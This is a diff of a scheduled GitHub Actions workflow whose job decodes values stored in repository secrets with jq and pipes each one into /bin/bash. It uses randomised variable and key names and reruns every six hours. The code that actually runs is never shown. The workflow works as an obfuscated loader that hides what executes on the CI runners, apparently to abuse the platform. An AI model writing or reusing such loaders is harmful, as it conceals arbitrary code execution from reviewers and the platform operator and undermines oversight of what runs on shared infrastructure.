@@ -3,22 +3,26 @@ name: drawingmisnomer
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 2/6 * * *'
+    - cron: '12 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: drawingmisnomer
         env:
-          ske1: ${{ secrets.ske1 }}
+          j04455: ${{ secrets.j04455 }}
         run: |
-          echo $ske1 | jq -r .ji3 | /bin/bash
-          echo $x84 | jq -r .ur352 | /bin/bash
-          echo $amh5706 | jq -r .ginkg88785 | /bin/bash
-          echo $whosm58 | jq -r .khezx369 | /bin/bash
-          echo $jr9 | jq -r .ni52 | /bin/bash
-          echo $z88 | jq -r .vgmi44 | /bin/bash
-          echo $ywbl4428 | jq -r .abip0526 | /bin/bash
-          echo $f10823 | jq -r .i84491 | /bin/bash
+          echo $j04455 | jq -r .bwjd794 | /bin/bash
+          echo $uz0 | jq -r .zmyc80 | /bin/bash
+          echo $wthck10 | jq -r .qegk3 | /bin/bash
+          echo $kfmrw901 | jq -r .o30 | /bin/bash
+          echo $fnw738 | jq -r .rkuk97 | /bin/bash
+          echo $gpjxj20224 | jq -r .lckh42542 | /bin/bash
+          echo $vozdz5274 | jq -r .jh655 | /bin/bash
+          echo $lg251 | jq -r .ap14 | /bin/bash
+          echo $vq1 | jq -r .cqzb06224 | /bin/bash
+          echo $xtrzz16 | jq -r .udmt3010 | /bin/bash
 
